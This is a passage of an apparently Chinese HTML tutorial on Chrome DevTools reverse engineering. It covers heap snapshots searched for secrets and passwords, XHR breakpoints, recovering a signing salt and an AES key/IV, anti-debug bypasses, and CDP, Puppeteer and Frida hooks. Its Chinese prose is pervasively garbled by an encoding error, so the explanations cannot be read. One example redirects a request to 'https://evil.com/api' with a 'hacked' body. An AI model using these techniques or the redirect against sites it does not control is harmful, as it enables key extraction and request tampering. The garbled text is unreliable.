<span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span><span class="w"> </span><span class="nx">delay</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[setTimeout] </span><span class="si">${</span><span class="nx">delay</span><span class="si">}</span><span class="sb">ms`</span><span class="p">,</span><span class="w"> </span><span class="nx">callback</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_setTimeout</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="6-æ€§èƒ½åˆ†æ-performance-profiling">6. æ€§èƒ½åˆ†æ (Performance Profiling)</h2>

      <h3 id="61-cpu-æ€§èƒ½åˆ†æ">6.1 CPU æ€§èƒ½åˆ†æ</h3>

      <p><strong>åœºæ™¯</strong>: ä»£ç è¿è¡Œå¾ˆæ…¢ï¼Œæ€€ç–‘æœ‰æ€§èƒ½ç“¶é¢ˆæˆ–æ•…æ„çš„å»¶è¿Ÿ</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>Performance é¢æ¿ â†’ ç‚¹å‡» Record</li>
        <li>æ‰§è¡Œç›®æ ‡æ“ä½œï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰</li>
        <li>åœæ­¢å½•åˆ¶</li>
        <li>æŸ¥çœ‹ <strong>Flame Chart</strong>ï¼ˆç«ç„°å›¾ï¼‰</li>
      </ol>

      <p><strong>åˆ†ææŠ€å·§</strong>:</p>

      <ul>
        <li><strong>å®½åº¦</strong> = æ‰§è¡Œæ—¶é—´ï¼ˆè¶Šå®½è¶Šæ…¢ï¼‰</li>
        <li><strong>é¢œè‰²</strong>:
          <ul>
            <li>é»„è‰² = JavaScript æ‰§è¡Œ</li>
            <li>ç´«è‰² = æ¸²æŸ“/å¸ƒå±€</li>
            <li>ç»¿è‰² = ç»˜åˆ¶</li>
          </ul>
        </li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>: å‘ç°æŸä¸ªå‡½æ•° <code>slowHash()</code> å ç”¨äº† 90% çš„ CPU æ—¶é—´ â†’ è¿™å°±æ˜¯åŠ å¯†/æ··æ·†çš„æ ¸å¿ƒé€»è¾‘</p>

      <h3 id="62-å†…å­˜åˆ†æ">6.2 å†…å­˜åˆ†æ</h3>

      <p><strong>åœºæ™¯</strong>: æ€€ç–‘ä»£ç ä¸­è—æœ‰è§£å¯†åçš„ Key æˆ–æ˜æ–‡æ•°æ®</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>Memory é¢æ¿ â†’ Take Heap Snapshot</li>
        <li>åœ¨æœç´¢æ¡†è¾“å…¥å…³é”®å­—ï¼ˆå¦‚ <code>secret</code>, <code>key</code>, <code>password</code>ï¼‰</li>
        <li>æŸ¥æ‰¾å­—ç¬¦ä¸²å¯¹è±¡</li>
      </ol>

      <p><strong>æŠ€å·§</strong>: å¯¹æ¯”ä¸¤ä¸ªå¿«ç…§</p>

      <ol>
        <li>æ‹ç¬¬ä¸€ä¸ªå¿«ç…§</li>
        <li>æ‰§è¡Œç›®æ ‡æ“ä½œï¼ˆå¦‚ç™»å½•ï¼‰</li>
        <li>æ‹ç¬¬äºŒä¸ªå¿«ç…§</li>
        <li>é€‰æ‹© Comparison æ¨¡å¼ â†’ æŸ¥çœ‹æ–°å¢çš„å¯¹è±¡</li>
      </ol>

      <hr />

      <h2 id="7-ç½‘ç»œè¯·æ±‚åˆ†æ">7. ç½‘ç»œè¯·æ±‚åˆ†æ</h2>

      <h3 id="71-xhrfetch-æ–­ç‚¹">7.1 XHR/Fetch æ–­ç‚¹</h3>

      <p>åœ¨ Sources é¢æ¿è®¾ç½® URL è¿‡æ»¤å™¨ï¼š</p>

      <pre><code>XHR/fetch Breakpoints:
- /api/login
- /api/data
</code></pre>

      <p>å½“å‘é€åŒ¹é…çš„è¯·æ±‚æ—¶è‡ªåŠ¨æ–­ç‚¹ï¼Œæ­¤æ—¶å¯ä»¥ï¼š</p>

      <ul>
        <li>æŸ¥çœ‹ Call Stackï¼ˆè°å‘èµ·çš„è¯·æ±‚ï¼‰</li>
        <li>æŸ¥çœ‹ Local å˜é‡ï¼ˆè¯·æ±‚å‚æ•°ï¼‰</li>
        <li>ä¿®æ”¹å‚æ•°åç»§ç»­æ‰§è¡Œ</li>
      </ul>

      <h3 id="72-ä¿®æ”¹è¯·æ±‚å‚æ•°">7.2 ä¿®æ”¹è¯·æ±‚å‚æ•°</h3>

      <p><strong>æ–¹æ³• 1: åœ¨æ–­ç‚¹å¤„ä¿®æ”¹</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ fetch() æ–­ç‚¹å¤„</span>
<span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://evil.com/api&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// ä¿®æ”¹ URL</span>
<span class="nx">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">hacked</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span><span class="w">  </span><span class="c1">// ä¿®æ”¹ Body</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: ä½¿ç”¨ Local Overrides</strong></p>

      <ol>
        <li>Network â†’ å³é”®è¯·æ±‚ â†’ &#8220;Override content&#8221;</li>
        <li>ä¿®æ”¹å“åº”å†…å®¹</li>
        <li>åˆ·æ–°é¡µé¢ â†’ ä½¿ç”¨ä¿®æ”¹åçš„å“åº”</li>
      </ol>

      <hr />

      <h2 id="8-å®æˆ˜æ¡ˆä¾‹">8. å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1è¿½è¸ªç­¾åå‡½æ•°çš„-salt">æ¡ˆä¾‹ 1ï¼šè¿½è¸ªç­¾åå‡½æ•°çš„ Salt</h3>

      <p><strong>ç›®æ ‡</strong>: æŸ API çš„ç­¾ååŒ…å«ä¸€ä¸ªæœªçŸ¥çš„ Salt</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>Network é¢æ¿æ‰¾åˆ°è¯·æ±‚ï¼Œå‘ç°å‚æ•° <code>sign=e8f2d3c1...</code></li>
        <li>æœç´¢ <code>sign</code> å…³é”®å­—ï¼Œæ‰¾åˆ° <code>generateSign()</code> å‡½æ•°</li>
        <li>åœ¨è¯¥å‡½æ•°å…¥å£æ‰“æ–­ç‚¹</li>
        <li>è§¦å‘è¯·æ±‚ï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰â†’ æ–­ç‚¹æš‚åœ</li>
        <li>æŸ¥çœ‹ Call Stack å’Œ Local Scope</li>
        <li>å‘ç°å±€éƒ¨å˜é‡ <code>salt = "my_secret_2024"</code></li>
        <li>åœ¨ Console ä¸­éªŒè¯ï¼š<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="nx">md5</span><span class="p">(</span><span class="s2">&quot;user_id=123&amp;timestamp=1638360000&amp;salt=my_secret_2024&quot;</span><span class="p">)</span><br />
<span class="c1">// ç»“æœä¸ sign åŒ¹é… âœ…</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <h3 id="æ¡ˆä¾‹-2å®šä½-aes-å¯†é’¥">æ¡ˆä¾‹ 2ï¼šå®šä½ AES å¯†é’¥</h3>

      <p><strong>ç›®æ ‡</strong>: æŸç™»å½•æ¥å£çš„å¯†ç æ˜¯ AES åŠ å¯†çš„ï¼Œå¯†é’¥æœªçŸ¥</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>æœç´¢ <code>AES.encrypt</code> å…³é”®å­—</li>
        <li>æ‰¾åˆ°åŠ å¯†å‡½æ•°ï¼š<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><br />
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="p">}).</span><span class="nx">toString</span><span class="p">();</span><br />
<span class="p">}</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <ol start="3">
        <li>åœ¨è¯¥å‡½æ•°æ‰“æ–­ç‚¹</li>
        <li>è§¦å‘ç™»å½•æ“ä½œ â†’ æ–­ç‚¹æš‚åœ</li>
        <li>æŸ¥çœ‹ Scope é¢æ¿ â†’ Closure éƒ¨åˆ†</li>
        <li>å‘ç° <code>key = "1234567890abcdef"</code>, <code>iv = "abcdef1234567890"</code></li>
        <li>åœ¨ Console ä¸­éªŒè¯ï¼š<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="s2">&quot;MyPassword&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="p">}).</span><span class="nx">toString</span><span class="p">()</span><br />
<span class="c1">// ç»“æœä¸å®é™…åŠ å¯†çš„å¯†ç åŒ¹é… âœ…</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <h3 id="æ¡ˆä¾‹-3è¿½è¸ªåŠ¨æ€ç”Ÿæˆçš„å‚æ•°">æ¡ˆä¾‹ 3ï¼šè¿½è¸ªåŠ¨æ€ç”Ÿæˆçš„å‚æ•°</h3>

      <p><strong>ç›®æ ‡</strong>: æŸè¯·æ±‚çš„ <code>device_id</code> å‚æ•°æ¯æ¬¡éƒ½ä¸åŒï¼Œä¸çŸ¥é“å¦‚ä½•ç”Ÿæˆ</p>

      <p><strong>æ–¹æ³• 1: XHR æ–­ç‚¹</strong></p>

      <ol>
        <li>è®¾ç½® XHR æ–­ç‚¹ï¼ˆURL: <code>/api/data</code>ï¼‰</li>
        <li>è§¦å‘è¯·æ±‚ â†’ è‡ªåŠ¨æ–­ç‚¹</li>
        <li>æŸ¥çœ‹ Call Stack:<br />
          <pre><code>send (XMLHttpRequest)
  â†‘
sendRequest (api.js:567)  â† æŸ¥çœ‹æ­¤å¤„ä»£ç 
  â†‘
onClick (main.js:89)<br />
</code></pre>
        </li>
        <li>è·³è½¬åˆ° <code>api.js:567</code>ï¼Œå‘ç°ï¼š<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">device_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getDeviceId</span><span class="p">();</span><span class="w">  </span><span class="c1">// è°ƒç”¨äº†å‡½æ•°</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <ol start="5">
        <li>ç»§ç»­è¿½è¸ª <code>getDeviceId()</code> å‡½æ•°</li>
      </ol>

      <p><strong>æ–¹æ³• 2: å±æ€§æ‹¦æˆª</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Console ä¸­æ‰§è¡Œ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">params</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;device_id&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s2">&quot;è®¾ç½® device_id:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">_device_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">_device_id</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// å½“ä»£ç æ‰§è¡Œ params.device_id = xxx æ—¶ï¼Œè‡ªåŠ¨æ–­ç‚¹</span>
</code></pre>
      </div>

      <h3 id="æ¡ˆä¾‹-4åè°ƒè¯•ç»•è¿‡">æ¡ˆä¾‹ 4ï¼šåè°ƒè¯•ç»•è¿‡</h3>

      <p><strong>ç°è±¡</strong>: æ‰“å¼€ DevTools åé¡µé¢ä¸€ç‰‡ç©ºç™½æˆ–æŠ¥é”™</p>

      <p><strong>å¸¸è§åè°ƒè¯•æ‰‹æ®µ</strong>:</p>

      <h4 id="æ£€æµ‹-devtools-æ‰“å¼€">æ£€æµ‹ DevTools æ‰“å¼€</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ console</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">devtools</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/./</span><span class="p">;</span>
<span class="nx">devtools</span><span class="p">.</span><span class="nx">toString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">opened</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="p">};</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;%c&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">devtools</span><span class="p">);</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">devtools</span><span class="p">.</span><span class="nx">opened</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;è¯·å…³é—­å¼€å‘è€…å·¥å…·&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ— é™ debugger å¾ªç¯</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <ol>
        <li>ç¦ç”¨æ‰€æœ‰æ–­ç‚¹ï¼ˆCtrl+F8ï¼‰</li>
        <li>æˆ–åœ¨ Console ä¸­æ‰§è¡Œï¼š<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="nx">devtools</span><span class="p">.</span><span class="nx">toString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"> </span><span class="p">};</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <h4 id="æ£€æµ‹é¡µé¢å¤§å°å˜åŒ–">æ£€æµ‹é¡µé¢å¤§å°å˜åŒ–</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="nb">window</span><span class="p">.</span><span class="nx">onresize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;about:blank&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// è·³è½¬ç©ºç™½é¡µ</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>: åœ¨ç‹¬ç«‹çª—å£æ‰“å¼€ DevToolsï¼ˆUndock into separate windowï¼‰</p>

      <h4 id="æ— é™-debugger">æ— é™ debugger</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <ol>
        <li>ç¦ç”¨æ‰€æœ‰æ–­ç‚¹ï¼ˆCtrl+F8ï¼‰</li>
        <li>æˆ–å³é”®ä»£ç  â†’ &#8220;Never pause here&#8221;</li>
      </ol>

      <hr />

      <h2 id="9-è°ƒè¯•æŠ€å·§æ€»ç»“">9. è°ƒè¯•æŠ€å·§æ€»ç»“</h2>

      <h3 id="91-å¿«é€Ÿå®šä½æŠ€å·§">9.1 å¿«é€Ÿå®šä½æŠ€å·§</h3>

      <table>
        <thead>
          <tr>
            <th>åœºæ™¯</th>
            <th>æ–¹æ³•</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ‰¾ä¸åˆ°ç­¾åå‡½æ•°</strong></td>
            <td>æœç´¢ <code>sign</code>ã€<code>signature</code>ã€<code>md5</code>ã€<code>sha</code></td>
          </tr>
          <tr>
            <td><strong>æ‰¾ä¸åˆ°åŠ å¯†å‡½æ•°</strong></td>
            <td>æœç´¢ <code>encrypt</code>ã€<code>AES</code>ã€<code>RSA</code>ã€<code>CryptoJS</code></td>
          </tr>
          <tr>
            <td><strong>æ‰¾ä¸åˆ°è¯·æ±‚å‘èµ·ç‚¹</strong></td>
            <td>Network â†’ Initiator â†’ ç‚¹å‡»é“¾æ¥</td>
          </tr>
          <tr>
            <td><strong>æ‰¾ä¸åˆ°äº‹ä»¶å¤„ç†å‡½æ•°</strong></td>
            <td>Elements â†’ Event Listeners</td>
          </tr>
          <tr>
            <td><strong>æ‰¾ä¸åˆ°å®šæ—¶å™¨å›è°ƒ</strong></td>
            <td>Sources â†’ Event Listener Breakpoints â†’ Timer</td>
          </tr>
        </tbody>
      </table>

      <h3 id="92-å¸¸è§é”™è¯¯">9.2 å¸¸è§é”™è¯¯</h3>

      <table>
        <thead>
          <tr>
            <th>é”™è¯¯</th>
            <th>åŸå› </th>
            <th>è§£å†³æ–¹æ¡ˆ</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>å˜é‡æ˜¾ç¤º <code>undefined</code></strong></td>
            <td>ä½œç”¨åŸŸä¸å¯¹</td>
            <td>æ£€æŸ¥ Scope é¢æ¿ï¼Œå¯èƒ½åœ¨ Closure ä¸­</td>
          </tr>
          <tr>
            <td><strong>æ–­ç‚¹ä¸ç”Ÿæ•ˆ</strong></td>
            <td>ä»£ç å·²ä¼˜åŒ–/å†…è”</td>
            <td>ä½¿ç”¨ Logpoint æˆ–ç¦ç”¨ç¼“å­˜</td>
          </tr>
          <tr>
            <td><strong>è°ƒç”¨æ ˆçœ‹ä¸åˆ°æºç </strong></td>
            <td>Source Map ç¼ºå¤±</td>
            <td>å¯»æ‰¾ <code>.map</code> æ–‡ä»¶æˆ–åˆ†æç¼–è¯‘åä»£ç </td>
          </tr>
          <tr>
            <td><strong>å¼‚æ­¥ä»£ç æ–­ä¸ä½</strong></td>
            <td>Async Stack Traces æœªå¼€å¯</td>
            <td>Settings â†’ Enable async stack traces</td>
          </tr>
        </tbody>
      </table>

      <h3 id="93-æ•ˆç‡æå‡æŠ€å·§">9.3 æ•ˆç‡æå‡æŠ€å·§</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. å¿«é€Ÿæ‰“å°è°ƒç”¨æ ˆ</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">();</span>

<span class="c1">// 2. å¿«é€Ÿæ‰“å°å¯¹è±¡ï¼ˆç¾åŒ–ï¼‰</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">table</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">dir</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">depth</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">});</span>

<span class="c1">// 3. æ€§èƒ½æµ‹è¯•</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">time</span><span class="p">(</span><span class="s2">&quot;åŠ å¯†è€—æ—¶&quot;</span><span class="p">);</span>
<span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">timeEnd</span><span class="p">(</span><span class="s2">&quot;åŠ å¯†è€—æ—¶&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// è¾“å‡ºï¼šåŠ å¯†è€—æ—¶: 123.45ms</span>

<span class="c1">// 4. åˆ†ç»„æ—¥å¿—</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">group</span><span class="p">(</span><span class="s2">&quot;ç­¾åè®¡ç®—è¿‡ç¨‹&quot;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;æ­¥éª¤ 1: å‚æ•°æ’åº&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">sorted</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;æ­¥éª¤ 2: æ‹¼æ¥å­—ç¬¦ä¸²&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">joined</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;æ­¥éª¤ 3: MD5 åŠ å¯†&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">hashed</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">groupEnd</span><span class="p">();</span>

<span class="c1">// 5. æ–­è¨€</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">assert</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nx">sign</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">expected</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ç­¾åä¸åŒ¹é…ï¼&quot;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="10-è¿›é˜¶å·¥å…·">10. è¿›é˜¶å·¥å…·</h2>

      <h3 id="101-chrome-devtools-protocol-cdp">10.1 Chrome DevTools Protocol (CDP)</h3>

      <p>é€šè¿‡ CDP å¯ä»¥ç¼–ç¨‹æ§åˆ¶ Chromeï¼Œå®ç°è‡ªåŠ¨åŒ–è°ƒè¯•ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>: ä½¿ç”¨ Python è‡ªåŠ¨æ‰“æ–­ç‚¹</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.chrome.options</span><span class="w"> </span><span class="kn">import</span> <span class="n">Options</span>

<span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s2">&quot;debuggerAddress&quot;</span><span class="p">,</span> <span class="s2">&quot;127.0.0.1:9222&quot;</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
<span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s2">&quot;Debugger.enable&quot;</span><span class="p">,</span> <span class="p">{})</span>
<span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s2">&quot;Debugger.setBreakpointByUrl&quot;</span><span class="p">,</span> <span class="p">{</span>
    <span class="s2">&quot;lineNumber&quot;</span><span class="p">:</span> <span class="mi">123</span><span class="p">,</span>
    <span class="s2">&quot;url&quot;</span><span class="p">:</span> <span class="s2">&quot;https://example.com/utils.js&quot;</span>
<span class="p">})</span>
</code></pre>
      </div>

      <h3 id="102-puppeteer-è°ƒè¯•æ¨¡å¼">10.2 Puppeteer è°ƒè¯•æ¨¡å¼</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
<span class="w">        </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="nx">devtools</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨æ‰“å¼€ DevTools</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// åœ¨æ§åˆ¶å°æ‰§è¡Œä»£ç </span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// é¡µé¢åŠ è½½å®Œæˆåè‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="103-frida-hook-ç§»åŠ¨ç«¯æ¡Œé¢åº”ç”¨">10.3 Frida Hook (ç§»åŠ¨ç«¯/æ¡Œé¢åº”ç”¨)</h3>

      <p>å¯¹äºéæµè§ˆå™¨ç¯å¢ƒï¼ˆå¦‚ Electronã€React Nativeï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ Fridaã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Frida è„šæœ¬</span>
<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;encrypt&quot;</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
